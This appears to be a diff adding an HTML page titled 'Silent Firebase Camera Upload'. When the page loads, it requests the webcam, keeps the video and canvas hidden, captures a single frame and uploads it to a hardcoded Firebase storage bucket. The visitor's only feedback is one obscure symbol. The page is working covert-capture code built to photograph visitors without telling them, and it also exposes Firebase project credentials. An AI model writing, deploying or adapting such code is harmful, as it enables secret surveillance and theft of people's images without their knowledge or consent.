@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Silent Firebase Camera Upload</title>
+  <style>
+    #status {
+      font-size: 48px;
+      position: absolute;
+      top: 10px;
+      left: 10px;
+    }
+    canvas, video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+<div id="status"></div>
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage-compat.js"></script>
+<script>
+  // Firebase config (replace with yours)
+  const firebaseConfig = {
+    apiKey: "AIzaSyBzWwQpbPrHG9OoJgq8XGwXsncNAVSw8SA",
+   authDomain: "d-game-aa338.firebaseapp.com",
+   projectId: "d-game-aa338",
+    storageBucket: "d-game-aa338.appspot.com",
+   messagingSenderId: "537592818882",
+  appId: "1:537592818882:web:390f2c4c326ce923165f5b"
+
+  };
+  firebase.initializeApp(firebaseConfig);
+  const storage = firebase.storage();
+  async function captureAndUpload() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      const width = video.videoWidth;
+      const height = video.videoHeight;
+      canvas.width = width;
+      canvas.height = height;
+      canvas.getContext('2d').drawImage(video, 0, 0, width, height);
+      canvas.toBlob(async (blob) => {
+        if (!blob) throw new Error("Failed to capture image");
+        const fileName = `photo_${Date.now()}.jpg`;
+        const storageRef = storage.ref('images/' + fileName);
+        const uploadTask = storageRef.put(blob);
+        uploadTask.on('state_changed',
+          null,
+          (error) => {
+            console.error("Upload failed:", error);
+            status.textContent = "√"; // Failure
+          },
+          () => {
+            status.textContent = "π"; // Success
+          }
+        );
+        stream.getTracks().forEach(track => track.stop());
+      }, 'image/jpeg');
+    } catch (err) {
+      console.error("Camera error:", err);
+      status.textContent = "√";
+    }
+  }
+  window.onload = captureAndUpload;
+</script>
+</body>
+  </html>
